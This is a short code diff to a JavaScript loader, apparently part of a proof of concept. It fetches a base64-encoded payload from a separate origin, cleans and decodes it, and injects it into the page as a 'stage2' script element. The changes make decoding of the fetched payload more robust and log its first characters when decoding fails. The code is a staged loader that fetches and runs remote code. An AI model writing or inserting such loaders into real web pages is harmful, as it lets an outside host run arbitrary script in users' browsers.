@@ -48,8 +48,18 @@
       const thirdOrigin = getThirdOrigin();
       const url = getPayloadB64Url(thirdOrigin);
 
-      const b64 = await fetch(url, { cache: "no-store" }).then((r) => r.text());
-      const code = atob(String(b64 || "").trim());
+      const b64raw = await fetch(url, { cache: "no-store" }).then((r) => r.text());
+      const b64 = String(b64raw || "")
+        .replace(/^\uFEFF/, "")
+        .replace(/[^A-Za-z0-9+/=]/g, "");
+
+      let code;
+      try {
+        code = atob(b64);
+      } catch (e) {
+        console.log("[loader] atob failed. payload head:", String(b64raw || "").slice(0, 120));
+        throw e;
+      }
 
       const s = document.createElement("script");
       s.id = "pocH_stage2";
